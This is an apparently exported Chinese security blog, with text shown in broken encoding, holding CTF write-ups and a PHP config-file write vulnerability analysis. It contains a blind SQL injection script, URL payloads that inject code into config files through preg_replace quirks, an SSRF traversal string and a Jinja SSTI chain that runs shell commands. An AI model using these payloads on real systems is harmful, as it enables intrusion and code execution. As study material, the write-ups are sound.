password='$password'"</span>;</span><br><span class="line">        $sql = sprintf($sql,$username);</span><br><span class="line">        print_r($sql);</span><br><span class="line">        $result = mysqli_query(<span class="keyword">$this</span>-&gt;mysqli,$sql);</span><br><span class="line">        $result = mysqli_fetch_object($result);</span><br><span class="line">        <span class="keyword">if</span>($result-&gt;id)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">session_start();</span><br></pre></td></tr></table></figure>

<p>è¯»æ–‡ä»¶å¯å¾—ï¼Œsqlæ³¨å…¥æ ¼å¼åŒ–ï¼Œé€ƒé€¸å•å¼•å·ï¼Œbypass or,ç„¶åæ— åˆ—åæ³¨å…¥ï¼Œå¾—åˆ°flagã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url=<span class="string">"http://eci-2zejdvvwkqa12mptvclx.cloudeci1.ichunqiu.com/index.php"</span></span><br><span class="line">proxies = &#123;</span><br><span class="line">  		<span class="string">"http"</span>: <span class="string">"http://127.0.0.1:8080"</span>,</span><br><span class="line">		&#125;</span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#erfenfa</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">	high = <span class="number">127</span></span><br><span class="line">	low = <span class="number">32</span></span><br><span class="line">	mid = (low + high) // <span class="number">2</span></span><br><span class="line">	<span class="keyword">while</span> high &gt; low:</span><br><span class="line">		<span class="comment">#payload=r"id=\\0&amp;path=or 1=(ascii(mid(CONCAT_WS(CHAR(32,58,32),user(),database(),version()),&#123;&#125;,1))&gt;&#123;&#125;)--+" #65</span></span><br><span class="line">		<span class="comment">#payload=r"id=\\0&amp;path=or 1=(ascii(mid((select/**/group_concat(column_NAME)/**/from/**/information_schema.columnS/**/where/**/table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;)--+"</span></span><br><span class="line">		payload=<span class="string">r"type=2&amp;imei=\" and if((ascii(mid((select password from users limit 1 offset 0),&#123;&#125;,1))&gt;&#123;&#125;),benchmark(1000000,sha(1)),0)#"</span></span><br><span class="line">		payload=<span class="string">"type=2&amp;imei=\" and if((ascii(mid((user()),&#123;&#125;,1))&gt;&#123;&#125;),benchmark(1000000,sha(1)),0)#"</span></span><br><span class="line">		payload=<span class="string">"(ascii(mid((select/**/group_concat(table_name)from sys.schema_table_statistics_with_buffer where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;)"</span></span><br><span class="line">		payload=<span class="string">"(ascii(mid((select x.1 from(select 1 union select * from fl4g)x limit 1,1),&#123;&#125;,1))&gt;&#123;&#125;)"</span></span><br><span class="line">		<span class="comment">#payload="(ascii(mid((select username ),&#123;&#125;,1))&gt;&#123;&#125;)"</span></span><br><span class="line">		url_1=url</span><br><span class="line">		data = &#123;<span class="string">"username"</span>:<span class="string">"admin"</span>,<span class="string">"password"</span>:<span class="string">"%1$' || "</span>+payload.format(i,mid)+<span class="string">"#"</span>&#125;</span><br><span class="line">		r=requests.post(url_1,data=data,proxies=proxies)</span><br><span class="line">		<span class="comment">#print(r.content)</span></span><br><span class="line">		<span class="keyword">if</span> <span class="string">"Success!"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">			low=mid+<span class="number">1</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			high=mid</span><br><span class="line">		mid=(low+high)//<span class="number">2</span></span><br><span class="line">	flag+=chr(mid)</span><br><span class="line">	print(flag) </span><br><span class="line"><span class="comment">#(select x.2 from(select 1,2,3 union select * from user)x)</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/14/2020%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bweb&miscWP/image-20201114195244441.png" alt="image-20201114195244441"></p>
<h1 id="pcap"><a href="#pcap" class="headerlink" title="pcap"></a>pcap</h1><p>ç”¨wiresharkæ‰“å¼€ï¼Œç­›é€‰å‡ºDNP3.0åè®®ï¼Œè¿½è¸ªæµå‘ç°è§„å¾‹</p>
<p><img src="/2020/11/14/2020%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bweb&miscWP/image-20201114194124842.png" alt="image-20201114194124842"></p>
<p>ç„¶åå†™è„šæœ¬è·‘</p>
<p><img src="/2020/11/14/2020%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bweb&miscWP/image-20201114194347238.png" alt="image-20201114194347238"></p>
<h1 id="pcap-analysis"><a href="#pcap-analysis" class="headerlink" title="pcap analysis"></a>pcap analysis</h1><p>å’Œä¸Šé¢˜ä¸€æ ·</p>
<p><img src="/2020/11/14/2020%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bweb&miscWP/image-20201114194531922.png" alt="image-20201114194531922"></p>
<p>ç›´æ¥æ‰‹æ•²ã€‚ã€‚ã€‚ã€‚</p>
]]></content>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>é…ç½®æ–‡ä»¶ä»»æ„å†™æ¼æ´åˆ†æ</title>
    <url>/2020/11/08/%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E5%86%99%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>å¯’å‡åœ¨å®¶æ—¶çœ‹äº†Pç‰›çš„<a href="https://www.leavesongs.com/PENETRATION/thinking-about-config-file-arbitrary-write.html" target="_blank" rel="noopener">ç»å…¸å†™é…ç½®æ¼æ´ä¸å‡ ç§å˜å½¢</a>ï¼Œä¸€ç›´åˆ°å¼€å­¦éƒ½æ²¡æœ‰ä»”ç»†å»åˆ†æå…¶ä¸­çš„åŸç†ã€‚æœ€è¿‘åˆçœ‹åˆ°äº†ï¼Œè¿˜æ˜¯å¥½å¥½åœ°åˆ†æä¸€ä¸‹å§ã€‚</p>
<a id="more"></a>

<p>Pç‰›åœ¨æ–‡ç« ä¸­æŠŠè¿™ç±»æ¼æ´åˆ†äº†</p>
<h1 id="0x01-è´ªå©ªæ¨¡å¼æ— s"><a href="#0x01-è´ªå©ªæ¨¡å¼æ— s" class="headerlink" title="0x01 è´ªå©ªæ¨¡å¼æ— s"></a>0x01 è´ªå©ªæ¨¡å¼æ— s</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//test.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$api = addslashes($_GET[<span class="string">'api'</span>]);</span><br><span class="line">$file = file_get_contents(<span class="string">'./option.php'</span>);</span><br><span class="line">$file = preg_replace(<span class="string">"/\\\$API = '.*';/"</span>, <span class="string">"\$API = '&#123;$api&#125;';"</span>, $file);</span><br><span class="line">file_put_contents(<span class="string">'./option.php'</span>, $file);</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//option.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$API = <span class="string">'test'</span>;</span><br></pre></td></tr></table></figure>

<blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.59.156&#x2F;test.php?api&#x3D;%27;%0aphpinfo();&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>

<p>å› ä¸º<code>phpinfo();</code>åé¢æœ‰å•å¼•å·ï¼Œæ‰€ä»¥éœ€è¦æ³¨é‡Šæ‰ã€‚</p>
</blockquote>
<img src="/2020/11/08/%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E5%86%99%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201108205228223.png" alt="image-20201108205228223" style="zoom: 200%;">

<blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.59.156&#x2F;test.php?api&#x3D;aa</span><br></pre></td></tr></table></figure>
</blockquote>
<p><img src="/2020/11/08/%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E5%86%99%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201108205326324.png" alt="image-20201108205326324"></p>
<h1 id="0x02-è´ªå©ªæ¨¡å¼æœ‰s"><a href="#0x02-è´ªå©ªæ¨¡å¼æœ‰s" class="headerlink" title="0x02 è´ªå©ªæ¨¡å¼æœ‰s"></a>0x02 è´ªå©ªæ¨¡å¼æœ‰s</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//test.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$api = addslashes($_GET[<span class="string">'api'</span>]);</span><br><span class="line">$file = file_get_contents(<span class="string">'./option.php'</span>);</span><br><span class="line">$file = preg_replace(<span class="string">"/\\\$API = '.*';/s"</span>, <span class="string">"\$API = '&#123;$api&#125;';"</span>, $file);</span><br><span class="line">file_put_contents(<span class="string">'./option.php'</span>, $file);</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//option.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$API = <span class="string">'test'</span>;</span><br></pre></td></tr></table></figure>

<blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.59.156&#x2F;test.php?api&#x3D;;phpinfo();</span><br></pre></td></tr></table></figure>
</blockquote>
<img src="/2020/11/08/%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E5%86%99%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201108210058585.png" alt="image-20201108210058585" style="zoom:200%;">

<blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.59.156&#x2F;test.php?api&#x3D;$0</span><br></pre></td></tr></table></figure>

<p><code>$0</code>ä¸ºæ­£åˆ™è¡¨è¾¾å¼åŒ¹é…åˆ°çš„å†…å®¹ï¼Œæ›¿æ¢ååˆšåˆšå¥½é—­åˆå‰é¢çš„å¼•å·ï¼Œé€ƒé€¸å‡º<code>phpinfo()</code>ã€‚</p>
</blockquote>
<p><img src="/2020/11/08/%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E5%86%99%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201108210456641.png" alt="image-20201108210456641"></p>
<h1 id="0x03-éè´ªå©ªæ— s"><a href="#0x03-éè´ªå©ªæ— s" class="headerlink" title="0x03 éè´ªå©ªæ— s"></a>0x03 éè´ªå©ªæ— s</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//test.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$api = addslashes($_GET[<span class="string">'api'</span>]);</span><br><span class="line">$file = file_get_contents(<span class="string">'./option.php'</span>);</span><br><span class="line">$file = preg_replace(<span class="string">"/\\\$API = '.*?';/"</span>, <span class="string">"\$API = '&#123;$api&#125;';"</span>, $file);</span><br><span class="line">file_put_contents(<span class="string">'./option.php'</span>, $file);</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//option.php</span></span><br><span class="line"><span class="comment">//option.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$API = <span class="string">'test'</span>;</span><br></pre></td></tr></table></figure>

<blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.59.156&#x2F;test.php?api&#x3D;%27;%0aphpinfo();&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
</blockquote>
<img src="/2020/11/08/%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E5%86%99%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201108211108334.png" alt="image-20201108211108334" style="zoom:200%;">

<blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.59.156&#x2F;test.php?api&#x3D;aa</span><br></pre></td></tr></table></figure>
</blockquote>
<p><img src="/2020/11/08/%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E5%86%99%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201108211150384.png" alt="image-20201108211150384"></p>
<h1 id="0x04-éè´ªå©ªæœ‰s"><a href="#0x04-éè´ªå©ªæœ‰s" class="headerlink" title="0x04 éè´ªå©ªæœ‰s"></a>0x04 éè´ªå©ªæœ‰s</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//test.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$api = addslashes($_GET[<span class="string">'api'</span>]);</span><br><span class="line">$file = file_get_contents(<span class="string">'./option.php'</span>);</span><br><span class="line">$file = preg_replace(<span class="string">"/\\\$API = '.*?';/s"</span>, <span class="string">"\$API = '&#123;$api&#125;';"</span>, $file);</span><br><span class="line">file_put_contents(<span class="string">'./option.php'</span>, $file);</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//option.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$API = <span class="string">'aa'</span>;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>åŒæ ·å¯ä»¥åˆ©ç”¨2çš„æ–¹æ³•</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.59.156&#x2F;test.php?api&#x3D;;phpinfo();</span><br></pre></td></tr></table></figure>
</blockquote>
<img src="/2020/11/08/%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E5%86%99%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201108211819260.png" alt="image-20201108211819260" style="zoom:200%;">

<blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.59.156&#x2F;test.php?api&#x3D;$0</span><br></pre></td></tr></table></figure>
</blockquote>
<p><img src="/2020/11/08/%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E5%86%99%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201108211904051.png" alt="image-20201108211904051"></p>
<blockquote>
<p>å¦å¤–è¿˜å¯ä»¥</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.59.156&#x2F;test.php?api&#x3D;aaa%27;phpinfo();&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
</blockquote>
<img src="/2020/11/08/%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E5%86%99%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201108212053654.png" alt="image-20201108212053654" style="zoom: 150%;">

<blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.59.156&#x2F;test.php?api&#x3D;aaa</span><br></pre></td></tr></table></figure>
</blockquote>
<img src="/2020/11/08/%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E5%86%99%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201108212136434.png" alt="image-20201108212136434" style="zoom:150%;">

<h1 id="0x05-defineè´ªå©ªæ— s"><a href="#0x05-defineè´ªå©ªæ— s" class="headerlink" title="0x05 defineè´ªå©ªæ— s"></a>0x05 defineè´ªå©ªæ— s</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//test.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$api = addslashes($_GET[<span class="string">'api'</span>]);</span><br><span class="line">$file = file_get_contents(<span class="string">'./option.php'</span>);</span><br><span class="line">$file = preg_replace(<span class="string">"/define\('API', '.*'\);/"</span>, <span class="string">"define('API', '&#123;$api&#125;');"</span>, $file);</span><br><span class="line">file_put_contents(<span class="string">'./option.php'</span>, $file);</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//option.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">define(<span class="string">'API'</span>, <span class="string">'aaa'</span>);</span><br></pre></td></tr></table></figure>

<blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.59.156&#x2F;test.php?api&#x3D;%27);%0aphpinfo();&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
</blockquote>
<img src="/2020/11/08/%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E5%86%99%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201108212702169.png" alt="image-20201108212702169" style="zoom:200%;">

<blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.59.156&#x2F;test.php?api&#x3D;aa</span><br></pre></td></tr></table></figure>
</blockquote>
<p><img src="/2020/11/08/%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E5%86%99%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201108212748153.png" alt="image-20201108212748153"></p>
<h1 id="0x06-defineè´ªå©ªæœ‰s"><a href="#0x06-defineè´ªå©ªæœ‰s" class="headerlink" title="0x06 defineè´ªå©ªæœ‰s"></a>0x06 defineè´ªå©ªæœ‰s</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//test.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$api = addslashes($_GET[<span class="string">'api'</span>]);</span><br><span class="line">$file = file_get_contents(<span class="string">'./option.php'</span>);</span><br><span class="line">$file = preg_replace(<span class="string">"/define\('API', '.*'\);/s"</span>, <span class="string">"define('API', '&#123;$api&#125;');"</span>, $file);</span><br><span class="line">file_put_contents(<span class="string">'./option.php'</span>, $file);</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//option.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">define(<span class="string">'API'</span>, <span class="string">'aaa'</span>);</span><br></pre></td></tr></table></figure>

<blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;t.php?api&#x3D;1\%27);phpinfo();%23</span><br></pre></td></tr></table></figure>

<p>å› ä¸º<code>preg_replace</code>åœ¨æ›¿æ¢çš„æ—¶å€™ä¼šåƒæ‰è½¬ä¹‰ç¬¦ï¼Œåˆ©ç”¨è¿™ä¸ªç‰¹ç‚¹ï¼Œå³å¯å¼•å…¥å•å¼•å·ã€‚è¿™ç§æ–¹æ³•å¯ä»¥é€šæ€å…¨æ–‡çš„</p>
</blockquote>
<p><img src="/2020/11/08/%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E5%86%99%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201108220939815.png" alt="image-20201108220939815"></p>
<h1 id="0x07-defineéè´ªå©ªæ— s"><a href="#0x07-defineéè´ªå©ªæ— s" class="headerlink" title="0x07 defineéè´ªå©ªæ— s"></a>0x07 defineéè´ªå©ªæ— s</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//test.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$api = addslashes($_GET[<span class="string">'api'</span>]);</span><br><span class="line">$file = file_get_contents(<span class="string">'./option.php'</span>);</span><br><span class="line">$file = preg_replace(<span class="string">"/define\('API', '.*?'\);/"</span>, <span class="string">"define('API', '&#123;$api&#125;');"</span>, $file);</span><br><span class="line">file_put_contents(<span class="string">'./option.php'</span>, $file);</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//option.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">define(<span class="string">'API'</span>, <span class="string">'aaa'</span>);</span><br></pre></td></tr></table></figure>

<blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;t.php?api&#x3D;1\%27);phpinfo();%23</span><br></pre></td></tr></table></figure>
</blockquote>
<blockquote>
<p><a href="http://192.168.59.156/test.php?api=%27);phpinfo();//" target="_blank" rel="noopener">http://192.168.59.156/test.php?api=%27);phpinfo();//</a></p>
</blockquote>
<img src="/2020/11/08/%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E5%86%99%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201108225823689.png" alt="image-20201108225823689" style="zoom:200%;">

<blockquote>
<p><a href="http://192.168.59.156/test.php?api=aa" target="_blank" rel="noopener">http://192.168.59.156/test.php?api=aa</a></p>
</blockquote>
<img src="/2020/11/08/%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E5%86%99%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201108225742409.png" alt="image-20201108225742409" style="zoom:150%;">

<h1 id="0x08-defineéè´ªå©ªæœ‰s"><a href="#0x08-defineéè´ªå©ªæœ‰s" class="headerlink" title="0x08 defineéè´ªå©ªæœ‰s"></a>0x08 defineéè´ªå©ªæœ‰s</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//test.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$api = addslashes($_GET[<span class="string">'api'</span>]);</span><br><span class="line">$file = file_get_contents(<span class="string">'./option.php'</span>);</span><br><span class="line">$file = preg_replace(<span class="string">"/define\('API', '.*?'\);/s"</span>, <span class="string">"define('API', '&#123;$api&#125;');"</span>, $file);</span><br><span class="line">file_put_contents(<span class="string">'./option.php'</span>, $file);</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//option.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">define(<span class="string">'API'</span>, <span class="string">'aaa'</span>);</span><br></pre></td></tr></table></figure>

<blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.59.156&#x2F;test.php?api&#x3D;%27);phpinfo();&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
</blockquote>
<img src="/2020/11/08/%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E5%86%99%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201108230146553.png" alt="image-20201108230146553" style="zoom:200%;">

<blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.59.156&#x2F;test.php?api&#x3D;aa</span><br></pre></td></tr></table></figure>
</blockquote>
<img src="/2020/11/08/%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E5%86%99%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201108230223421.png" alt="image-20201108230223421" style="zoom:200%;">

<p>å‚è€ƒé“¾æ¥ï¼š</p>
<p><a href="https://www.leavesongs.com/PENETRATION/thinking-about-config-file-arbitrary-write.html" target="_blank" rel="noopener">ç»å…¸å†™é…ç½®æ¼æ´ä¸å‡ ç§å˜å½¢</a></p>
]]></content>
      <tags>
        <tag>vul</tag>
      </tags>
  </entry>
  <entry>
    <title>2020-UNCTF-Web-wp</title>
    <url>/2020/11/08/2020-UNCTF-Web-wp/</url>
    <content><![CDATA[<p>è®°å½•å¤ç°2020UNCTFéƒ¨åˆ†é¢˜ç›®</p>
<a id="more"></a>

<h1 id="0x01-easy-ssrf"><a href="#0x01-easy-ssrf" class="headerlink" title="0x01 easy_ssrf"></a>0x01 easy_ssrf</h1><p>ç›´æ¥</p>
<p>url=00://unctf.com/../../../../../../../flag</p>
<p><img src="/2020/11/08/2020-UNCTF-Web-wp/image-20201108135113057.png" alt="image-20201108135113057"></p>
<h1 id="0x02-easyflask"><a href="#0x02-easyflask" class="headerlink" title="0x02 easyflask"></a>0x02 easyflask</h1><p>adminç™»é™†åå¯ä»¥å¾—åˆ°/secret_route_you_do_not_knowè·¯ç”±</p>
<p>ç„¶åå¯ä»¥æµ‹è¯•åˆ°guesså‚æ•°å­˜åœ¨SSTIã€‚ä½†æ˜¯è¿‡æ»¤äº†<code>_ &#39; &quot; ] %</code>,æœ€ååˆ©ç”¨<code>|attr</code>å’Œ<code>request</code>ç»•è¿‡è¿‡æ»¤ï¼Œæ‰§è¡Œå‘½ä»¤ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;secret_route_you_do_not_know?guess&#x3D;&#123;&#123;app|attr(request.args.param)|attr(request.args.a)|attr(request.args.b)()|attr(request.args.c)(117)|attr(request.args.d)|attr(request.args.e)|attr(request.args.c)(request.args.f)|attr(request.args.c)(request.args.g)(request.args.h)&#125;&#125;&amp;param&#x3D;__class__&amp;a&#x3D;__base__&amp;b&#x3D;__subclasses__&amp;c&#x3D;__getitem__&amp;d&#x3D;__init__&amp;e&#x3D;__globals__&amp;f&#x3D;__builtins__&amp;g&#x3D;eval&amp;h&#x3D;__import__(&quot;os&quot;).popen(&#39;cat%20flag.txt&#39;).read()</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/08/2020-UNCTF-Web-wp/image-20201108135159161.png" alt="image-20201108135159161"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random <span class="keyword">as</span> rd</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ranstr</span><span class="params">(num)</span>:</span></span><br><span class="line">    H = &amp;<span class="comment">#39;abcdefghijklmnopqrstuvwxyz0123456789&amp;#39;</span></span><br><span class="line">    salt = &amp;<span class="comment">#39;&amp;#39;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(num):</span><br><span class="line">        salt += rd.choice(H)</span><br><span class="line">    <span class="keyword">return</span> salt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SECRET = ranstr(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">Flask.secret_key = SECRET</span><br><span class="line"></span><br><span class="line">BLACKLIST = [&amp;<span class="comment">#39;%&amp;#39;, &amp;#39;_&amp;#39;, &amp;#39;eval&amp;#39;, &amp;#39;open&amp;#39;, &amp;#39;flag&amp;#39;,</span></span><br><span class="line">             &amp;<span class="comment">#39;in&amp;#39;, &amp;#39;-&amp;#39;, &amp;#39;class&amp;#39;, &amp;#39;mro&amp;#39;, &amp;#39;[&amp;#39;, &amp;#39;]&amp;#39;, &amp;#39;\&amp;#34;&amp;#39;, &amp;#39;\&amp;#39;&amp;#39;]</span></span><br><span class="line"></span><br><span class="line">user_dicts = dict()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init</span><span class="params">()</span>:</span></span><br><span class="line">    user_dicts[&amp;<span 